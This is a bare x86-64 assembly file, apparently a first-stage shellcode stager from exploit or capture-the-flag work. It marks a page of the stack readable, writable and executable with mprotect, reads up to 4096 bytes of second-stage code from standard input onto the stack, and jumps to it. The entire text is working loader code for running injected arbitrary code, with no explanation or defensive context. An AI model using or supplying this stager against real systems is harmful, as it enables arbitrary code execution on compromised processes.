BITS 64
	GLOBAL _start

_start:
    xor rax, rax
    mov ax, 0x1001
    dec eax
    mov r12, rax
    dec eax
    not rax
    and rsp, rax

    ;; mprotect(rsp, 0x1000, 0x7)
    xor rax, rax
    mov al, 10
    mov rdi, rsp
    mov rsi, r12
    xor rdx, rdx
    mov dl, 7

    ;; read(0, rsp, 0x1000)
    syscall
    xchg rdx, rsi
    xchg rdi, rsi
    xor rdi, rdi
    syscall

    ;; jmp on the stage2
    jmp rsp
